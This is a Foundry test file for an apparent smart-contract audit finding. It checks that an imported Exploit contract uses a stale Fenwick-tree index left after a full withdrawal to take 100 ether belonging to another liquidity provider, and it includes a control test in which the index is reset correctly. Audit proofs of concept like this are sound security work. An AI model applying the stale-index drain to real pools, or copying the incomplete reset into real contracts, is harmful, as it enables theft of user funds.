// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Asset,
    Exploit,
    FenwickPool,
    Holder
} from "./57737-c-03-incorrect-index-reset-in-fenwick-tree-after-full-withdr.sol";

contract Finding57737Test is Test {
    function test_stale_index_3_unlocks_an_extra_100() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.staleAt3(), 100 ether, "index 3 still holds 100");
        assertEq(e.unlocked(), 250 ether, "prefix is 250");
        assertEq(e.taken(), 250 ether, "remove pays 250");
        assertEq(e.taken() - 150 ether, 100 ether, "extra is 100");
        assertEq(e.victimLeft(), 0, "other LP is short 100");
        // Constructor minted 450. Withdrawals paid 550. Net gain during run() is 100.
        assertEq(e.token().balanceOf(address(e)), 550 ether, "attacker holds 550");
    }

    function test_control_full_reset_pays_only_the_new_150() public {
        Asset token = new Asset();
        FenwickPool pool = new FenwickPool(token, true);
        Holder victim = new Holder();
        token.mint(address(this), 450 ether);
        token.mint(address(victim), 100 ether);
        token.approve(address(pool), type(uint256).max);
        victim.approve(token, address(pool), 100 ether);

        pool.deposit(1, 100 ether);
        pool.deposit(2, 100 ether);
        pool.deposit(3, 100 ether);
        pool.fullWithdraw();
        assertEq(pool.fenwicksTree(3), 0, "control cleared index 3");

        victim.fund(pool, 100 ether);
        pool.deposit(1, 50 ether);
        pool.deposit(2, 50 ether);
        pool.deposit(3, 50 ether);
        assertEq(pool.prefix(3), 150 ether, "control prefix is 150");
        uint256 taken = pool.removeLiquidity(3);
        assertEq(taken, 150 ether, "control pays 150");
        assertEq(taken - 150 ether, 0, "extra is 0");
        assertEq(token.balanceOf(address(pool)), 100 ether, "other LP keeps 100");
    }
}
